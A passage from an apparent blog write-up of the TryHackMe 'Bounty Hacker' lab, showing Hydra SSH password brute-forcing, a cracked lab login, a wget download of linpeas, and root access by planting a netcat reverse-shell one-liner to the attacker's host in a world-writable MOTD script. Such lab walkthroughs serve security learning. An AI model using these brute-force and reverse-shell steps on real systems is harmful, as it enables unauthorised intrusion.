[WARNING] Restorefile (ignored <span style=color:#f92672>...</span>) <span style=color:#f92672>from</span> a previous session found, to prevent overwriting, <span style=color:#f92672>./</span>hydra<span style=color:#f92672>.</span>restore                                                                                                         
[DATA] max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>676</span> login tries (l:<span style=color:#ae81ff>26</span><span style=color:#f92672>/</span>p:<span style=color:#ae81ff>26</span>), <span style=color:#f92672>~</span><span style=color:#ae81ff>43</span> tries per task                                                                                                                
[DATA] attacking ssh:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>:<span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>                                                                                                                                                                            
[VERBOSE] Resolving addresses <span style=color:#f92672>...</span> [VERBOSE] resolving done                                                                                                                                                         
[INFO] Testing <span style=color:#66d9ef>if</span> password authentication <span style=color:#f92672>is</span> supported by ssh:<span style=color:#f92672>//</span>rEddrAGON<span style=color:#a6e22e>@10.10.56.222</span>:<span style=color:#ae81ff>22</span>                                                                                                                          
[INFO] Successful, password authentication <span style=color:#f92672>is</span> supported by ssh:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>:<span style=color:#ae81ff>22</span>                                                                                                                                   
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;rEddrAGON&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;rEddrAGON&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>676</span> [child <span style=color:#ae81ff>0</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                                    
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;rEddrAGON&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;ReDdr4g0nSynd!cat3&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span> of <span style=color:#ae81ff>676</span> [child <span style=color:#ae81ff>1</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                           
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;rEddrAGON&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;Dr@gOn$yn9icat3&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>3</span> of <span style=color:#ae81ff>676</span> [child <span style=color:#ae81ff>2</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                              
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;rEddrAGON&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;R3DDr46ONSYndIC@Te&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span> of <span style=color:#ae81ff>676</span> [child <span style=color:#ae81ff>3</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)
<span style=color:#f92672>....</span>
</code></pre></div><p>Scan went on and nothing!</p><p>‚Äî</p><p>Now we need to go back to our findings, since, we aren&rsquo;t able to move forward with these. Relooking at the file <code>task.txt</code>, we can see that it also has an username in it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># cat task.txt</span>
<span style=color:#ae81ff>1.</span>) Protect Vicious<span style=color:#f92672>.</span>
<span style=color:#ae81ff>2.</span>) Plan <span style=color:#66d9ef>for</span> Red Eye pickup on the moon<span style=color:#f92672>.</span>

<span style=color:#f92672>-</span>lin
</code></pre></div><p>See that <code>lin</code> signature/name in the end? Let&rsquo;s try that with the list <code>rocks.txt</code> against the host.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># hydra -l lin -P locks.txt 10.10.56.222 -s 22 ssh -t 4 -I                                                                                                                                                 130 ‚®Ø</span>
Hydra v9<span style=color:#f92672>.</span><span style=color:#ae81ff>1</span> (c) <span style=color:#ae81ff>2020</span> by van Hauser<span style=color:#f92672>/</span>THC <span style=color:#f92672>&amp;</span> David Maciejak <span style=color:#f92672>-</span> Please do <span style=color:#f92672>not</span> use <span style=color:#f92672>in</span> military <span style=color:#f92672>or</span> secret service organizations, <span style=color:#f92672>or</span> <span style=color:#66d9ef>for</span> illegal purposes (this <span style=color:#f92672>is</span> non<span style=color:#f92672>-</span>binding, these <span style=color:#f92672>***</span> ignore laws <span style=color:#f92672>and</span> ethics anyway)<span style=color:#f92672>.</span>

Hydra (https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>vanhauser<span style=color:#f92672>-</span>thc<span style=color:#f92672>/</span>thc<span style=color:#f92672>-</span>hydra) starting at <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>29</span>:<span style=color:#ae81ff>38</span>
[DATA] max <span style=color:#ae81ff>4</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>4</span> tasks, <span style=color:#ae81ff>26</span> login tries (l:<span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>p:<span style=color:#ae81ff>26</span>), <span style=color:#f92672>~</span><span style=color:#ae81ff>7</span> tries per task
[DATA] attacking ssh:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>:<span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>
[<span style=color:#ae81ff>22</span>][ssh] host: <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>   login: lin   password: RedDr4gonSynd1cat3
<span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
Hydra (https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>vanhauser<span style=color:#f92672>-</span>thc<span style=color:#f92672>/</span>thc<span style=color:#f92672>-</span>hydra) finished at <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>29</span>:<span style=color:#ae81ff>50</span>
</code></pre></div><p>‚Äî</p><p>That worked!</p><p><code>lin:RedDr4gonSynd1cat3</code></p><p>‚Äî</p><p>Let&rsquo;s SSH into the host and grab the <code>user.txt</code> flag</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># ssh lin@10.10.56.222                                                                        </span>
The authenticity of host <span style=color:#e6db74>&#39;10.10.56.222 (10.10.56.222)&#39;</span> can<span style=color:#e6db74>&#39;t be established.</span>
ECDSA key fingerprint <span style=color:#f92672>is</span> SHA256:fzjl1gnXyEZI9px29GF<span style=color:#f92672>/</span>tJr<span style=color:#f92672>+</span>u8o9i88XXfjggSbAgbE<span style=color:#f92672>.</span>
Are you sure you want to <span style=color:#66d9ef>continue</span> connecting (yes<span style=color:#f92672>/</span>no<span style=color:#f92672>/</span>[fingerprint])<span style=color:#960050;background-color:#1e0010>?</span> yes
<span style=color:#a6e22e>Warning</span>: Permanently added <span style=color:#e6db74>&#39;10.10.56.222&#39;</span> (ECDSA) to the list of known hosts<span style=color:#f92672>.</span>
lin<span style=color:#a6e22e>@10.10.56.222</span><span style=color:#e6db74>&#39;s password: </span>
Welcome to Ubuntu <span style=color:#ae81ff>16.04</span><span style=color:#f92672>.</span><span style=color:#ae81ff>6</span> LTS (GNU<span style=color:#f92672>/</span>Linux <span style=color:#ae81ff>4.15</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>101</span><span style=color:#f92672>-</span>generic x86_64)

 <span style=color:#f92672>*</span> Documentation:  https:<span style=color:#f92672>//</span>help<span style=color:#f92672>.</span>ubuntu<span style=color:#f92672>.</span>com
 <span style=color:#f92672>*</span> Management:     https:<span style=color:#f92672>//</span>landscape<span style=color:#f92672>.</span>canonical<span style=color:#f92672>.</span>com
 <span style=color:#f92672>*</span> Support:        https:<span style=color:#f92672>//</span>ubuntu<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>advantage

<span style=color:#ae81ff>83</span> packages can be updated<span style=color:#f92672>.</span>
<span style=color:#ae81ff>0</span> updates are security updates<span style=color:#f92672>.</span>

Last login: Sun Jun  <span style=color:#ae81ff>7</span> <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>41</span> <span style=color:#ae81ff>2020</span> <span style=color:#f92672>from</span> <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.14</span>
lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~/</span>Desktop<span style=color:#960050;background-color:#1e0010>$</span> 
lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~/</span>Desktop<span style=color:#960050;background-color:#1e0010>$</span> id
uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span>(lin) gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span>(lin) groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1001</span>(lin)
lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~/</span>Desktop<span style=color:#960050;background-color:#1e0010>$</span>
lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~/</span>Desktop<span style=color:#960050;background-color:#1e0010>$</span> wc <span style=color:#f92672>-</span>c user<span style=color:#f92672>.</span>txt 
<span style=color:#ae81ff>21</span> user<span style=color:#f92672>.</span>txt
</code></pre></div><p>We&rsquo;re inside! üíÄ ‚Äî</p><p>Submitted flag and I just realized that I should have taken a look at hints to save some of the time wasted in using bogus lists! üòñ</p><p>Oh well, can&rsquo;t reverse time üôè</p><p><img loading=lazy src=/images/bounty_hacker-thm/Untitled%201.png alt></p><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>Let&rsquo;s run <code>[linpeas.sh](http://linpeas.sh)</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> wget http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.17</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.120</span><span style=color:#f92672>/</span>linpeas<span style=color:#f92672>.</span>sh <span style=color:#f92672>&amp;&amp;</span> chmod <span style=color:#f92672>+</span>x linpeas<span style=color:#f92672>.</span>sh
                                                    
<span style=color:#f92672>--</span><span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>08</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>34</span>:<span style=color:#ae81ff>29</span><span style=color:#f92672>--</span>  http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.17</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.120</span><span style=color:#f92672>/</span>linpeas<span style=color:#f92672>.</span>sh
Connecting to <span style=color:#ae81ff>10.17</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.120</span>:<span style=color:#ae81ff>80.</span><span style=color:#f92672>..</span> connected<span style=color:#f92672>.</span>  
HTTP request sent, awaiting response<span style=color:#f92672>...</span> <span style=color:#ae81ff>200</span> OK                                                           
Length: <span style=color:#ae81ff>328992</span> (<span style=color:#ae81ff>321</span>K) [text<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>sh]
Saving to: <span style=color:#960050;background-color:#1e0010>‚Äò</span>linpeas<span style=color:#f92672>.</span>sh<span style=color:#960050;background-color:#1e0010>‚Äô</span>
                                                    
linpeas<span style=color:#f92672>.</span>sh                                           <span style=color:#ae81ff>100</span><span style=color:#f92672>%</span>[<span style=color:#f92672>=====================================================================================================================&gt;</span>] <span style=color:#ae81ff>321.28</span>K   <span style=color:#ae81ff>262</span>KB<span style=color:#f92672>/</span>s    <span style=color:#f92672>in</span> <span style=color:#ae81ff>1.2</span>s    

<span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>08</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>34</span>:<span style=color:#ae81ff>31</span> (<span style=color:#ae81ff>262</span> KB<span style=color:#f92672>/</span>s) <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>‚Äò</span>linpeas<span style=color:#f92672>.</span>sh<span style=color:#960050;background-color:#1e0010>‚Äô</span> saved [<span style=color:#ae81ff>328992</span><span style=color:#f92672>/</span><span style=color:#ae81ff>328992</span>]

lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> 
lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#f92672>./</span>linpeas<span style=color:#f92672>.</span>sh
</code></pre></div><p>Let&rsquo;s go through the interesting things.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>[<span style=color:#f92672>+</span>] Interesting Firefox Files                                                                            
[i] https:<span style=color:#f92672>//</span>book<span style=color:#f92672>.</span>hacktricks<span style=color:#f92672>.</span>xyz<span style=color:#f92672>/</span>forensics<span style=color:#f92672>/</span>basic<span style=color:#f92672>-</span>forensics<span style=color:#f92672>-</span>esp<span style=color:#f92672>/</span>browser<span style=color:#f92672>-</span>artifacts<span style=color:#75715e>#firefox                                                                                                                            </span>
Found <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla                                                                                 
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>addons<span style=color:#f92672>.</span>json                                          
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>bookmarkbackups                               
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>cookies<span style=color:#f92672>.</span>sqlite                                       
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>favicons<span style=color:#f92672>.</span>sqlite                                      
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>formhistory<span style=color:#f92672>.</span>sqlite                                   
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>handlers<span style=color:#f92672>.</span>json                                                                                                                                                  
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>key4<span style=color:#f92672>.</span>db                                              
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>places<span style=color:#f92672>.</span>sqlite                      
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin<span style=color:#f92672>/.</span>mozilla<span style=color:#f92672>/</span>firefox<span style=color:#f92672>/</span>o0cm87l0<span style=color:#f92672>.</span>default<span style=color:#f92672>-</span>release<span style=color:#f92672>/</span>prefs<span style=color:#f92672>.</span>js
</code></pre></div><p>Can we use firefox&rsquo;s <code>credentials db</code> for passwords? Let&rsquo;s check all in the end.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>[<span style=color:#f92672>+</span>] Interesting writable files owned by me <span style=color:#f92672>or</span> writable by everyone (<span style=color:#f92672>not</span> <span style=color:#f92672>in</span> Home) (max <span style=color:#ae81ff>500</span>)                                                                                                                         
[i] https:<span style=color:#f92672>//</span>book<span style=color:#f92672>.</span>hacktricks<span style=color:#f92672>.</span>xyz<span style=color:#f92672>/</span>linux<span style=color:#f92672>-</span>unix<span style=color:#f92672>/</span>privilege<span style=color:#f92672>-</span>escalation<span style=color:#75715e>#writable-files                                                                                                                                     </span>
<span style=color:#f92672>/</span>dev<span style=color:#f92672>/</span>mqueue                                                                                                                                                                                                        
<span style=color:#f92672>/</span>dev<span style=color:#f92672>/</span>shm                                                                                                                                                                                                           
<span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>update<span style=color:#f92672>-</span>motd<span style=color:#f92672>.</span>d<span style=color:#f92672>/</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>header                                                                                                                                                                                       
<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>lin                                                                                                                                                                                                          
<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>lock                                                                                                                                                                                                          
<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>user<span style=color:#f92672>/</span><span style=color:#ae81ff>1001</span>                                                                                                                                                                                                     
<span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>user<span style=color:#f92672>/</span><span style=color:#ae81ff>1001</span><span style=color:#f92672>/</span>systemd                                                                                                                                                                                             
<span style=color:#f92672>/</span>tmp                                                                                                                                                                                                               
<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/.</span>font<span style=color:#f92672>-</span>unix                                                                                          
<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/.</span>ICE<span style=color:#f92672>-</span>unix                                                                                           
<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/.</span>Test<span style=color:#f92672>-</span>unix                                                                                          
<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/.</span>X11<span style=color:#f92672>-</span>unix                                                                                           
<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/.</span>XIM<span style=color:#f92672>-</span>unix                                                                                                                                                                                                     
<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>crash                                                                                               
<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>lightdm<span style=color:#f92672>-</span>data<span style=color:#f92672>/</span>lin                                                                                                                                                                                          
<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>metrics                                                                                             
<span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>tmp
</code></pre></div><p><code>/etc/update-motd.d/00-header</code> is writeable? really? Noice! We can edit this and SSH again as our user to execute this and get reverse shell!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> ls <span style=color:#f92672>-</span>la <span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>update<span style=color:#f92672>-</span>motd<span style=color:#f92672>.</span>d<span style=color:#f92672>/</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>header
<span style=color:#f92672>-</span>rwxr<span style=color:#f92672>-</span>xrwx <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1221</span> Jun  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2020</span> <span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>update<span style=color:#f92672>-</span>motd<span style=color:#f92672>.</span>d<span style=color:#f92672>/</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>header
</code></pre></div><p>It is indded <strong>writeable!</strong> Let&rsquo;s add reverse shell one liner in the file right after shebang <code>#!/bin/sh</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>lin<span style=color:#a6e22e>@bountyhacker</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> which nc 
<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>nc
</code></pre></div><p>Let&rsquo;s use the following for reverses shell on <strong>port 5555</strong> of our host.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.17.0.120 <span style=color:#ae81ff>5555</span> &gt;/tmp/f
</code></pre></div><p>After adding reverse shell one-liner to the file, it looks like:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/sh
</span><span style=color:#75715e></span>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.17.0.120 <span style=color:#ae81ff>5555</span> &gt;/tmp/f

<span style=color:#75715e>#</span>
<span style=color:#75715e>#    00-header - create the header of the MOTD</span>
<span style=color:#75715e>#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    This program is free software; you can redistribute it and/or modify</span>
<span style=color:#75715e>#    it under the terms of the GNU General Public License as published by</span>
<span style=color:#75715e>#    the Free Software Foundation; either version 2 of the License, or</span>
<span style=color:#75715e>#    (at your option) any later version.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    This program is distributed in the hope that it will be useful,</span>
<span style=color:#75715e>#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style=color:#75715e>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style=color:#75715e>#    GNU General Public License for more details.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    You should have received a copy of the GNU General Public License along</span>
<span style=color:#75715e>#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style=color:#75715e>#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style=color:#f92672>[</span> -r /etc/lsb-release <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> . /etc/lsb-release

<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z <span style=color:#e6db74>&#34;</span>$DISTRIB_DESCRIPTION<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>[</span> -x /usr/bin/lsb_release <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
        <span style=color:#75715e># Fall back to using the very slow lsb_release utility</span>
        DISTRIB_DESCRIPTION<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>lsb_release -s -d<span style=color:#66d9ef>)</span>
<span style=color:#66d9ef>fi</span>

printf <span style=color:#e6db74>&#34;Welcome to %s (%s %s %s)\n&#34;</span> <span style=color:#e6db74>&#34;</span>$DISTRIB_DESCRIPTION<span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -o<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -r<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -m<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><p>Can see our one-liner in the second line, let&rsquo;s save this and do <strong>SSH</strong> again as the user <strong>lin.</strong> Remember to start listener on <strong>port 5555</strong> beforehand!</p><h3 id=root-shell>Root shell!<a hidden class=anchor aria-hidden=true href=#root-shell>#</a></h3><p><img loading=lazy src=/images/bounty_hacker-thm/Untitled%202.png alt></p><p>Alright, that was an easy machine but we wasted more than necessary time (i.e. 30 minutes on an easy machine).</p><p>Hopefully, you enjoyed the writeup! üòá</p><hr><h2 id=things-learnt-and-not-todos>Things learnt (and not todos):<a hidden class=anchor aria-hidden=true href=#things-learnt-and-not-todos>#</a></h2><ul><li>Always check the files we already have for username/passwords</li><li>Don&rsquo;t waste unnecessary time with long lists bruteforcing against slow protocols</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/tryhackme/>tryhackme</a></li><li><a href=https://umar0x01.sh/tags/nmap/>nmap</a></li><li><a href=https://umar0x01.sh/tags/ftp/>ftp</a></li><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/http/>http</a></li><li><a href=https://umar0x01.sh/tags/gobuster/>gobuster</a></li><li><a href=https://umar0x01.sh/tags/cewl/>cewl</a></li><li><a href=https://umar0x01.sh/tags/hydra/>hydra</a></li><li><a href=https://umar0x01.sh/tags/bruteforcing/>bruteforcing</a></li><li><a href=https://umar0x01.sh/tags/privesc/>privesc</a></li></ul><nav class=paginav><a class=prev href=https://umar0x01.sh/post/ignite-thm/><span class=title>¬´ Prev Page</span><br><span>TryHackMe - Ignite</span></a>
